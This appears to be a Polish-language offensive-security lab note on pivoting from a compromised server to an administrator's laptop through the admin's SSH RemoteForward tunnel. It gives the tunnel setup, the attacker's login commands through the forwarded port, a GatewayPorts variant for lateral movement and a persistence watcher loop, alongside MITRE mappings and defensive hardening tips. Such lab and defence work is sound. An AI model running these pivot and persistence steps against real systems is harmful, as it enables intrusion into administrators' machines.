# Stronger without `-A`: SSH RemoteForward (`-R`) — his SSH is on your box

Admin łączy się **normalnie kluczem**, **bez agenta**. Jeśli wpuści **tunel wsteczny**, jego **sshd** staje się dostępny **u ciebie** na `127.0.0.1:<port>`.

To działa **przez internet** — nie potrzebujesz Docker `/proc`, ani `ssh -A`.

## Błąd admina / IT

```bash
# „Otwórz tunel do debugowania”
ssh -a -i key -N -R 127.0.0.1:3322:127.0.0.1:22 legacy@infected-host
```

Albo w `~/.ssh/config` na laptopie:

```
Host infected
  RemoteForward 127.0.0.1:3322 127.0.0.1:22
```

## Ty (root na zainfekowanym)

```bash
ss -tln | grep 3322
ssh -i <klucz_admina_lub_inny> -p 3322 admin@127.0.0.1
```

Masz **pełne SSH na laptopie admina** — nie proxy agenta, **bezpośrednio jego port 22** przez tunel.

## MITRE

| ID | Rola |
|----|------|
| T1021.004 | SSH |
| T1572 | Protocol tunneling |
| T1078 | Valid accounts (klucz admina na jego sshd) |

## vs inne wektory (bez `-A`)

| Wektor | Zasięg |
|--------|--------|
| `/proc/PID/root` | Klient ssh na **tym samym** hypervisorze |
| **`-R` RemoteForward** | Admin **zdalny** — wystarczy że otworzy tunel |
| `nc -e` | Osobna scenka (klient sam oddaje shell) |

## Mocniejszy wariant (lab only)

`GatewayPorts yes` + `-R 0.0.0.0:3322:...` — tunel słucha na **wszystkich** interfejsach serwera (lateral z innej maszyny w sieci).

## Obrona

- `AllowTcpForwarding no` na serwerach, do których nie powinni wchodzić admini z zewnątrz.
- `GatewayPorts no` (domyślnie).
- Monitoruj `sshd` + `ss -tln` na nietypowych portach po sesjach SSH.
- Zakaz `RemoteForward` w configach zarządzanych przez MDM.

## Lab

```bash
# Kali: legacy :2221
bash ~/Desktop/htb/ttp-docker-ssh-lab/setup_kali_user.sh

# Admin container z entry_remote_forward.sh (zamiast zwykłego entry.sh)
docker run ... admin-workstation  # zobacz ACCESS-R.md w ttp-docker-ssh-lab

sudo bash ~/Desktop/htb/ttp-docker-ssh-lab/scripts/pivot_via_remote_forward.sh
```

Skrypt repo: `ssh-infected-admin-pivot/pivot_via_remote_forward.sh`

## Persistence

Watcher na port **3322** (nie na proces ssh):

```bash
while ss -tlnH | grep -q ':3322'; do
  ./pivot_via_remote_forward.sh && break
  sleep 2
done
```

Albo **systemd path** gdy `ss` zapisuje stan do pliku z twojego hooka.